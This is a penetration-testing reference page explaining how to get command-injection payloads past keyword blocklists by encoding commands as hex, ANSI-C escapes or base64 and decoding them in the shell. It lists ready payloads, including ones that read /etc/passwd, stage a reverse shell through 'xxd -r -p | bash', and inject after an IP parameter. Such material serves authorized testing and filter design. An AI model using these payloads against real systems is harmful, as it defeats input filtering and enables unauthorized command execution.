---
title: "Command injection filter bypass with hex and runtime decoding"
description: "Carrying a command as hex or ANSI-C escapes—$'\\x77\\x68\\x6f\\x61\\x6d\\x69', echo -e, xxd -r—and decoding it at runtime so the filtered keyword never appears literally in the request."
keywords:
  - command injection
  - hex encoding
  - ANSI-C quoting
  - runtime decoding
  - filter bypass
  - xxd
---

# Hex and runtime decoding

A blocklist matches the literal keyword in the request. If the command is carried as **encoded bytes** and decoded by the shell only at execution time, the keyword is never present as a literal for the filter to see. Hex is the most compact form: Bash ANSI-C quoting (`$'\xNN'`) decodes hex escapes inline, and `echo -e`, `xxd -r`, or `printf` reconstruct bytes that are then piped to a shell.

> **Scope.** For authorized penetration tests, red-team engagements, and CTF labs against systems you are contracted to assess. Executing commands without written authorization is unlawful.

## Why the shell normalizes it away

The shell decodes the escape sequence or the pipeline **after** the filter has inspected the request. `$'\x77\x68\x6f\x61\x6d\x69'` is, to the filter, the ASCII string `$ ' \ x 7 7 …`—no `w`, `h`, `o`, `a`, `m`, `i` adjacency, no `whoami` substring. Bash's ANSI-C quoting evaluates the hex escapes to the bytes `whoami` only when the word is expanded, and the result is executed. The forbidden keyword materializes inside the shell, past the point where the blocklist looked.

## ANSI-C quoting (inline, no external binary)

`$'...'` decodes `\xNN` hex (and `\NNN` octal) escapes:

```
$'\x77\x68\x6f\x61\x6d\x69'          # → whoami
$'\x69\x64'                          # → id
$'\x63\x61\x74' /etc/passwd          # → cat /etc/passwd
```

Encode the whole invocation and hand it to a shell when arguments are also filtered:

```
bash -c $'\x69\x64'                  # run "id"
$'\x2f\x62\x69\x6e\x2f\x69\x64'      # → /bin/id
```

## Decode-and-pipe with echo -e / printf

`echo -e` interprets backslash escapes; pipe the decoded bytes into a shell:

```
echo -e '\x77\x68\x6f\x61\x6d\x69' | sh
printf '\x69\x64\x0a' | bash
```

`\x0a` (newline) terminates the command cleanly when piping into the interpreter.

## Decode-and-pipe with xxd / base64

`xxd -r -p` reverses a plain hex dump; `base64 -d` does the Base64 equivalent. Both keep the keyword out of the request:

```
echo 77686f616d69 | xxd -r -p | sh          # hex "whoami"
echo 6964 | xxd -r -p | bash                # hex "id"
echo d2hvYW1p | base64 -d | sh              # base64 "whoami"
```

Staging a longer payload the same way avoids cramming a full command—and its metacharacters—through the parameter:

```
echo <hex-of-reverse-shell> | xxd -r -p | bash
```

## Combining with other tricks

Runtime decoding composes with no-space and separator techniques:

```
127.0.0.1;echo${IFS}6964|xxd${IFS}-r${IFS}-p|sh
{echo,77686f616d69}|{xxd,-r,-p}|sh
```

Every keyword in the pipeline is either absent (carried as hex) or itself split by `${IFS}`/brace groups, so a literal blocklist has nothing contiguous to match.

## Operational notes

- `$'\xNN'` ANSI-C quoting is a **Bash/zsh** feature; `/bin/sh` (dash) does not decode it. `printf '\xNN'`, `xxd`, and `base64` are external binaries—confirm they are present and not themselves filtered.
- Append a newline (`\x0a`) when piping into an interpreter so the decoded command executes.
- Hex avoids not only the keyword but also awkward characters (spaces, slashes) since those bytes are encoded too.

## References

- [PayloadsAllTheThings: Command Injection — Bypass with encoding](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [GTFOBins: xxd](https://gtfobins.github.io/gtfobins/xxd/)
- [Bash Reference Manual: ANSI-C Quoting](https://www.gnu.org/software/bash/manual/html_node/ANSI_002dC-Quoting.html)
